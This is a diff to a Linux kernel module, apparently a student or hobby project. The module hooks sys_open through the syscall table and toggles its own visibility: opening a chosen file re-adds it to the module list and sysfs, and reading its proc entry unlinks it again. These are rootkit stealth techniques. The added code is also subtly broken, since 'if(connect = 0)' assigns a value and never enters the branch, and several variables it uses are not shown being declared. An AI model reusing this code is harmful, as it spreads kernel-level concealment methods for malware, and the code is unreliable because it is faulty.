@@ -17,6 +17,7 @@ struct list_head* n;
 char filepath[128] = { 0x0, } ;
 void ** sctable ;
 int count = 0 ;
+int connect = 0;
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 
@@ -24,14 +25,31 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 {
 	char fname[256] ;
 
+
 	copy_from_user(fname, filename, 256) ;
 	
 	
 	
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
 		count++ ;
-		printk("connect\n");
-		list_add(&THIS_MODULE->list, p); //add to procfs
+		if(connect = 0){
+    			list_add(&THIS_MODULE->list, p); //add to procfs
+			//add the module to sysfs
+    			result = kobject_add(&THIS_MODULE->mkobj.kobj, kobject_parent_prev, "my_module");     
+		    	if(result<0) {
+			    printk(KERN_ALERT "Error to restore the old kobject\n");
+		    	}
+ 			//add the holders dir to the module folder
+    			result2 = kobject_add(THIS_MODULE->holders_dir, &THIS_MODULE->mkobj.kobj, "holders");
+			if(!THIS_MODULE->holders_dir) {
+				printk(KERN_ALERT "Error to restore the old holders_dir\n");
+			 }
+    			THIS_MODULE->sect_attrs = sect_attrs_bkp;
+    			THIS_MODULE->notes_attrs = notes_attrs_bkp;
+			
+			connect = 1;
+
+		}
 		return -1 ;
 	}
 	return orig_sys_open(filename, flags, mode) ;
@@ -53,8 +71,13 @@ ssize_t openhook_proc_read(struct file *file, char __user *ubuf, size_t size, lo
 {
 	char buf[256] ;
 	ssize_t toread ;
-	printk("disconnect\n");
-	list_del_init(&modules_list); 
+	if(connect==1){
+		list_del_init(&modules_list); 
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+		printk("disconnect\n");
+		connect = 0;
+	}
+
 	sprintf(buf, "%s:%d\n", filepath, count) ;
 	
 
